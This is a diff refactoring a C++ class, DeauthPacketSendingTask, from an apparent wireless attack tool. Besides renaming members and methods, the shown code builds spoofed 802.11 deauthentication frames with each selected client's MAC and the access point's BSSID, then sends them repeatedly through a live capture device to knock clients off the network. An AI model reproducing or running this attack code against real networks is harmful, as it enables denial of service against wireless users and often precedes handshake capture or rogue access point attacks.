@@ -9,25 +9,25 @@ ashk::tasks::DeauthPacketSendingTask::DeauthPacketSendingTask(pcpp::PcapLiveDevi
                                                               std::vector<std::shared_ptr<WifiHost>> &host_list,
                                                               int last_task_id) :
     dev_(dev),
-    wifi_ap(&wifi_ap),
-    iface_name_or_ip(iface_name_or_ip),
-    Task(last_task_id), host_list(&host_list) {
+    wifi_ap_(&wifi_ap),
+    iface_name_or_ip_(iface_name_or_ip),
+    Task(last_task_id), host_list_(&host_list) {
 
 }
 
-std::string ashk::tasks::DeauthPacketSendingTask::get_data(ashk::tasks_data_id data_id) {
+std::string ashk::tasks::DeauthPacketSendingTask::GetData(tasks_data_id data_id) {
   return std::string();
 }
 
-void ashk::tasks::DeauthPacketSendingTask::exec() {
-  logger.log("starting sending deauth packets . . .\n");
-  dev_ = pcpp::PcapLiveDeviceList::getInstance().getDeviceByIpOrName(iface_name_or_ip);
+void ashk::tasks::DeauthPacketSendingTask::Exec_() {
+  logger_.Log("starting sending deauth packets . . .\n");
+  dev_ = pcpp::PcapLiveDeviceList::getInstance().getDeviceByIpOrName(iface_name_or_ip_);
   if (dev_ == nullptr) {
-    logger.log("couldn't find device\n");
+    logger_.Log("couldn't find device\n");
     return;
   }
   if (!dev_->open()) {
-    logger.log("couldn't open device");
+    logger_.Log("couldn't open device");
     return;
   }
 
@@ -59,16 +59,16 @@ void ashk::tasks::DeauthPacketSendingTask::exec() {
       0x07, 0x00              // Reason code = 7 (class 3 error)
   };
 
-  while (is_running()) {
+  while (IsRunning()) {
     std::vector<pcpp::Packet> packets;
-    for (auto i : *host_list) {
+    for (auto i : *host_list_) {
       if (i->is_selected) {
         auto pkt = new uint8_t[sizeof(packet)];
         memcpy(pkt, packet, sizeof(packet));
 
         memcpy(pkt + 16, i->mac.getRawData(), 6);
-        memcpy(pkt + 22, wifi_ap->b_ssid.getRawData(), 6);
-        memcpy(pkt + 28, wifi_ap->b_ssid.getRawData(), 6);
+        memcpy(pkt + 22, wifi_ap_->b_ssid.getRawData(), 6);
+        memcpy(pkt + 28, wifi_ap_->b_ssid.getRawData(), 6);
 
         auto rawPacket = new pcpp::RawPacket(pkt, sizeof(packet), timeval{0, 0}, false);
         packets.emplace_back(rawPacket);
@@ -81,7 +81,7 @@ void ashk::tasks::DeauthPacketSendingTask::exec() {
     std::this_thread::sleep_for(std::chrono::milliseconds(2000));
   }
 
-  end();
-  logger.log("stopped sending deauth packets\n");
+  End();
+  logger_.Log("stopped sending deauth packets\n");
 }
 
